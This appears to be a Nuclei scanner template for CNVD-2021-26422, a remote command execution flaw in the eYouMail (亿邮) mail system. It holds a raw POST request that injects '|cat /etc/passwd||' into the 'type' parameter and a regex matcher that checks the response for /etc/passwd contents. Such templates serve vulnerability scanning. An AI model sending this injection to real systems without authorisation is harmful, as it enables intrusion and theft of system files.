id: CNVD-2021-26422

info:
  name: eYouMail 亿邮系统 - 远程命令执行(CNVD-2021-26422)
  author: wintry
  severity: critical
  description: eYouMail is susceptible to a remote code execution vulnerability.
  reference:
    - https://github.com/ltfafei/my_POC/blob/master/CNVD-2021-26422_eYouMail/CNVD-2021-26422_eYouMail_RCE_POC.py
  tags: eyoumail
  metadata:
    max-request: 1

http:
  - raw:
      - |
        POST /webadm/?q=moni_detail.do&action=gragh HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        type='|cat /etc/passwd||'

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200